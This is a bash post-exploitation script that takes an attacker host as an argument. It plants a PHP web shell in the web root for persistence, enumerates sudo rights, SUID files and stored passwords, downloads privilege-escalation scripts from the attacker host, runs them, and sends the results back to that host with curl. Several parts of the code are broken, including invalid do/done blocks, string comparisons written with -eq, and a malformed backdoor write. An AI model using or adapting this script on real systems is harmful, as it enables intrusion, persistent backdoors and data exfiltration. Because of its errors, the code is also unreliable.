#!/usr/bin/bash

usage() 
{ 
		echo "USAGE:"
		echo "-i	Attacker IP/Host"
		echo "-u	Local User to Check"
		echo "-d 	Specify Path To Local wget/curl downloader"	
}

setdload()
{
command -v curl >/dev/null 2>&1
if [ $? -eq 0 ]; then
	echo "\n[*] Curl Found. Continuing.\n"
	dload="curl"
else
	command -v wget >/dev/null 2>&1
	if [ $? -eq 0 ]; then
		echo "\n[*] OK. wget found. Continuingd.\n"
		dload="wget"
	else
		echo "\n [!] Neither curl nor wget found. Skipping downloads\n"
		echo "\n [!] Specify with '-n' \n"
		dload="null"
	fi
fi
}	

prep()
{
	# Check first argument is supplied. Should be hostname/IP address
	if [ -z "$ip" ]
	then
		echo "Host Required"
		exit
	fi
	
	# Check /dev/shm is available for storing and running scripts
	# Else use /tmp
	if [ -d "/dev/shm" ]; then
		var dir="/dev/shm"
	else
		var dir="/tmp"
	fi
	
	mkdir $dir/recon
	cd $dir/recon
	
	# curl or wget?
	if [ -z "$dload" ] ; then
		setdload
	fi
	
	# python2 or 3?
	#command -v foo >/dev/null 2>&1 || { echo "I require foo but it's not installed.  Aborting." >&2; exit 1; }
	#https://www.cyberciti.biz/faq/unix-linux-shell-find-out-posixcommand-exists-or-not/
}

# Install PHP backdoor in web root
persist()
{
	echo "#### Backdoor Install Attempt ####\n"
	echo "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/shell.php
	if [ $? -eq 0 ]; then
		echo "\n[*] OK. Backdoor Installed.\n"
	else
		echo "\n [!] Failed. Check Permissions\n"
		ls -la /var/www
	fi
}

# Run quick enum commands
quick_enum()
{
	echo "\n#### Sudoers ####\n"
	sudo -l
	
	echo "\n#### Kernel ####\n"
	uname -a
	
	echo "\n#### SUID Files ####\n"
	find / -type f -perm -4000 2>/dev/null
	
	echo "\n#### Passwords in /opt?? ####\n"
	grep -iRl password /opt/*
	
	echo "\n#### Check /opt ####\n"
	ls -la /opt
	
	echo "\n#### Any wp-config.php files? ####\n"
	find / -name wp-config.php 2>/dev/null
	
	if [ "$user" ] ; then
		echo "\n#### Files Owned by User: $user ####\n"
		find / -user $2 2>/dev/null
	fi
	
	echo "\n#### Processes ####\n"
	ps aux
}

# Download enumeration scripts and binaries
download()
{
	if [ $dload -eq "wget" ] ; then
	do 
		echo "\n#### Downloading LinEnum.sh ####\n"
		$dload $1/LinEnum.sh
	
		echo "\n#### Downloading psspy ####\n"
		$dload $1/psspy
	
		echo "\n#### Downloading linux-priv-checker ####\n"
		$dload $1/linuxprivchecker.py
	
		echo "\n#### Downloading linpeas.sh ####\n"
		$dload $1/linpeas.sh
	
		echo "\n#### Downloading lse.sh ####\n"
		$dload $1/lse.sh
	done
}

# Execute enum scripts
execute()
{
	scripts=("LinEnum.sh" "linpeas.sh" "lse.sh")
	
	for script in "${scripts[@]}"
	do
		echo "\n#### Run $script ####\n"
		bash $script > $script.txt
	done
}

# Exfiltrate enum script results
exfiltrate()
{
	if [ $dload -eq "curl" ] ; then
	do
		files=("LinEnum.sh.txt" "linpeas.sh.txt" "lse.sh.txt")
	
		for file in "${files[@]}"
		do
			echo "\n#### Exfiltrating: $file ####\n" 
			curl -F "data=@$file" $1:443
		done
	done
}

run()
{
	prep
	persist
	quick_enum
	download
	execute
	exfiltrate
}

# Get user arguments
while getopts "h:i:u:d" option; do
 case "${option}" in
    i) ip=${OPTARG};;
    u) user=${OPTARG};;
    d) dload=${OPTARG};;
    h) usage; exit;;
    *) usage; exit;;
 esac
done

run
